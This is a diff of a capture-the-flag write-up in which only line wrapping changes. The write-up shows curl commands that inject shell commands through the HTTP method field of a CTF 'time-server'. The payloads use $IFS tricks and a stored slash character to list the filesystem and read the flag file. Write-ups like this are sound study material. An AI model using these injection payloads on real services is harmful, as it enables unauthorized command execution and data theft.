@@ -712,7 +712,8 @@ Look at the string in `RCX`: `static/`. That's where the static files must be lo
 At this point, my team and I tried many, many different Bash tricks to get command output locally. A breakthrough came when one teammate suggested using `$*` to separate `$IFS` from the next string. This allowed us to create spaces. I was excited. We had a clear path to the flag, and we just needed to locate and `cat` it. I ran the following expectantly:
 
 ```bash
-$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&find$IFS..|tee$IFS$*styles.css' >/dev/null`
+$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&find$IFS..|tee$IFS$*styles.css' >/dev/null`
 $ curl time-server.ctf:8080/styles.css
 ..
 ../.bash_logout
@@ -743,7 +744,8 @@ Among the clutter of our output files, there was no flag. Fine, I'll just run `f
 
 ```bash
 $ # The command is: echo && cd static && ls -dF | tr -d . | tee styles.css
-$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&ls$IFS-dF|tr$IFS-d$IFS$*.|tee$IFS$*styles.css' >/dev/null
+$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&ls$IFS-dF|tr$IFS-d$IFS$*.|tee$IFS$*styles.css' >/dev/null
 $ curl time-server.ctf:8080/styles.css
 /
 ```
@@ -751,9 +753,11 @@ $ curl time-server.ctf:8080/styles.css
 Great, now I can save a `/` character to a file and then `cat` that file to use `/` in the command. 
 
 ```bash
-$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&ls$IFS-dF|tr$IFS-d$IFS$*.|tee$IFS$*slash' >/dev/null
+$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&ls$IFS-dF|tr$IFS-d$IFS$*.|tee$IFS$*slash' >/dev/null
 $ # The command is: echo && cd static && find / | tee style.css
-$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&find$IFS$*`cat$IFS$*slash`|tee$IFS$*styles.css' >/dev/null
+$ curl time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&find$IFS$*`cat$IFS$*slash`|tee$IFS$*styles.css' >/dev/null
 $ # A suspiciously long time later, the curl returns
 $ wget time-server.ctf:8080/styles.css
 ```
@@ -796,7 +800,8 @@ No flag. Impossible. There had to be a flag. I asked the organizers to check our
 
 ```bash
 $ # The command is: echo && cd static && ls / | tee styles.css
-$ curl -v time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&ls$IFS$*`cat$IFS$*slash`|tee$IFS$*styles.css' >/dev/null
+$ curl -v time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&ls$IFS$*`cat$IFS$*slash`|tee$IFS$*styles.css' >/dev/null
 $ curl time-server.ctf:8080/styles.css
 bin
 boot
@@ -819,7 +824,8 @@ tmp
 usr
 var
 $ # The command is: echo && cd static && cat /flag | tee styles.css
-$ curl -v time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a -X '&&cd$IFS$*static&&cat$IFS$*`cat$IFS$*slash`flag|tee$IFS$*styles.css' 
+$ curl -v time-server.ctf:8080/?mlaasdkfasldkfm=0739a949de455a1f745a8d3dcc4b179a \
+-X '&&cd$IFS$*static&&cat$IFS$*`cat$IFS$*slash`flag|tee$IFS$*styles.css' 
 $ curl time-server.ctf:8080/styles.css
 FLAG-ac0c58453b7208f9ee9d204b54988b98
 ```
